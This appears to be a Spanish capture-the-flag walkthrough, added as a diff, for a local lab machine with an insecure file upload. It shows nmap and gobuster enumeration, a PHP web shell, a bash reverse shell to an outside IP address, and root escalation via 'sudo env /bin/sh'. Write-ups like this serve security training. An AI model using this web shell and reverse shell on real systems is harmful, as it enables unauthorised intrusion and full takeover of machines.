@@ -1,0 +1,53 @@
+Guía para Penetration Testing: Escaneo y Escalada de Privilegios
+
+1. Preparación de la Máquina:
+   - Descarga de los archivos de la máquina desde https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ.
+   - Descompresión de los archivos descargados.
+   - Ejecución del comando `auto_deploy.sh upload.tar` para arrancar la máquina en nuestro sistema.
+   - Apertura de una nueva ventana de comandos para dejar correr la máquina.
+
+2. Escaneo de la Red y Mapeo de Puertos:
+   - Al realizar un nmap con el siguiente comando, obtenemos:
+     ```bash
+     nmap -p- -sS -sC -sV --min-rate 3000 -n -vvv -Pn 172.17.0.2 -oN /home/kali/Desktop/upload/escaneo
+     ```
+
+3. Análisis de Servicios y Puertos Abiertos:
+   - Observamos un servicio HTTP por el puerto 80, ejecutando Apache httpd 2.4.52 en Ubuntu.
+   - Al inspeccionar la página web, encontramos un código PHP que permite la subida de archivos.
+
+4. Exploración y Enumeración de Directorios:
+   - Utilizamos Gobuster para buscar en qué directorio se encuentran los archivos subidos y si tenemos acceso a él:
+     ```bash
+     gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
+     ```
+   - Encontramos la ruta `/uploads/` donde se ubican los archivos subidos.
+
+5. Explotación de Vulnerabilidades:
+   - Creamos un archivo PHP malicioso para obtener acceso mediante Remote Code Execution (RCE):
+     ```php
+     <?php
+         system($_GET['cmd']);
+     ?>
+     ```
+   - Subimos el archivo y ejecutamos nuestro documento a través de http://172.17.0.2/uploads/cmd.php?cmd=id.
+
+6. Escalada de Privilegios:
+   - Ejecutamos un reverse shell desde la dirección del navegador para obtener acceso a la máquina:
+     ```
+     bash -c "bash -i >& /dev/tcp/192.168.1.39/443 0>&1"
+     ```
+   - Realizamos un tratamiento de la tty para operar cómodamente sobre la consola.
+
+7. Identificación de Privilegios Elevados:
+   - Ejecutamos `sudo -l` para listar los permisos de sudo que tiene el usuario actual en el sistema.
+   - Observamos que el usuario www-data puede ejecutar el comando `/usr/bin/env` como root sin contraseña.
+
+8. Escalada de Privilegios a Root:
+   - Utilizamos GTFOBins para encontrar la forma de escalar privilegios a través de `env`.
+   - Accedemos a root con el comando `sudo env /bin/sh`.
+
+9. Conclusión:
+   - Hemos obtenido acceso a la máquina mediante la explotación de vulnerabilidades en el servicio web y la escalada de privilegios a root.
+   - Es fundamental documentar todos los pasos realizados y los resultados obtenidos para futuras referencias y análisis.
+
